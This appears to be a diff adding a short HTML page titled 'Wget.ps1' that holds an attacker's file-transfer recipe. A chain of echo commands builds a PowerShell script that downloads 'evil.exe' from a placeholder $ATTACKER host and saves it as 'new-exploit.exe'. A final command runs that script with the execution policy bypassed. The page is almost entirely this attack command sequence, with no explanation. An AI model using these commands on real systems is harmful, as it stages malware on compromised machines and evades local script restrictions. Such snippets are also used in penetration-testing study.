@@ -1,0 +1,12 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Wget.ps1</title>
+</head><body>echo $storageDir = $pwd &gt; wget.ps1 &nbsp; <br/>
+echo $webclient = New-Object System.Net.WebClient &gt;&gt; wget.ps1 &nbsp; <br/>
+echo $url = "http://$ATTACKER/evil.exe" &gt;&gt; wget.ps1<br/>
+echo $file = "new-exploit.exe" &gt;&gt; wget.ps1 &nbsp; &nbsp;<br/>
+echo $webclient.DownloadFile($url,$file) &gt;&gt; wget.ps1<br/>
+<br/>
+C:\&gt; powershell.exe -ExecutionPolicy Bypass ‐NoLogo &nbsp;‐NonInteractive &nbsp;‐NoProfile ‐File wget.ps1</body></html>
